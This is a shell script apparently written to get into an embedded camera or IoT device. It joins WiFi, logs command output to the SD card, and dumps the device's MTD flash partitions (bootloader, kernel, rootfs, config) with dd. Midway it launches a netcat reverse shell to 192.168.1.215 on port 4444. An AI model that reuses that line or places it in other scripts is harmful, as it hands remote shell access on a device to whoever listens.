#!/bin/sh

# Variables
SD_FOLDER="/mnt/config/record"


# Functions
connect_to_wifi()
{
    SD_FOLDER="/mnt/config/record"
    wifi_dev="wlan0"

    while true
    do
        # wait for driver ready. #
        ret=`ifconfig | grep $wifi_dev`
        if [ "$ret" = ""  ];then
            ifconfig $wifi_dev up
        else
            break
        fi
        sleep 0.3
    done

    # connect to WiFi network #
    wpa_supplicant -B -i$wifi_dev -c /mnt/config/wpa_conf
    udhcpc -i$wifi_dev -b -x hostname:$PRODUCT_MODE

    # Record IP Address to SD Card
    touch $SD_FOLDER/ip.txt
    ip_addr=$(ifconfig wlan0|grep "inet addr:"|awk -F "inet addr:" '{print $2}'|awk -F ' ' '{print $1}')
    echo "IP Address is ${ip_addr}" >> $SD_FOLDER/ip.txt

}

run_command_and_log() 
{   
    SD_FOLDER="/mnt/config/record"
    command=$1
    file_path=${SD_FOLDER}/tmp_test.txt
    
    # If second arg is passed, then set the file path
    if [ -n "$2" ]; then
        file_path=$SD_FOLDER/$2
    fi

    echo "Running Command: $command" >> $file_path
    echo "" >> $file_path
    $command >> $file_path
    echo "" >> $file_path
    echo "" >> $file_path
}

# Program Start
connect_to_wifi

run_command_and_log "echo 'XXXXXXXXXXXXXXX BACKUP /proc/mtd XXXXXXXXXXXX'"
run_command_and_log "cat /proc/mtd"
 
# cat /proc/mtd | tail -n+2 | while read; do
#     MTD_DEV=$(echo ${REPLY} | cut -f1 -d:)
#     MTD_NAME=$(echo ${REPLY} | cut -f2 -d\")
#     run_command_and_log "echo 'Backing up ${MTD_DEV} (${MTD_NAME})'"
#     # It's important that the remote command only prints the actual file
#     # contents to stdout, otherwise our backup files will be corrupted. Other
#     # info must be printed to stderr instead. Luckily, this is how the dd
#     # command already behaves by default, so no additional flags are needed.
#     dd if="/dev/${MTD_DEV}ro" > "${SD_FOLDER}/${MTD_DEV}_${MTD_NAME}.backup" || die "dd ${MTD_DEV}ro failed, aborting..."
# done

mkdir -p /tmp/bin/
ln -s /bin/busybox /tmp/bin/nanddump
nc 192.168.1.215 4444 -e /bin/sh &
sleep 120
run_command_and_log "ps aux"

dd if="/dev/mtd0ro" > "/mnt/config/record/mtd0_UBOOT.backup"
dd if="/dev/mtd1ro" > "/mnt/config/record/mtd1_ENV.backup"
dd if="/dev/mtd2ro" > "/mnt/config/record/mtd2_ENVBK.backup"
dd if="/dev/mtd3ro" > "/mnt/config/record/mtd3_DTB.backup"
dd if="/dev/mtd4ro" > "/mnt/config/record/mtd4_KERNEL.backup"
dd if="/dev/mtd5ro" > "/mnt/config/record/mtd5_ROOTFS.backup"
dd if="/dev/mtd6ro" > "/mnt/config/record/mtd6_CONFIG.backup"                                                               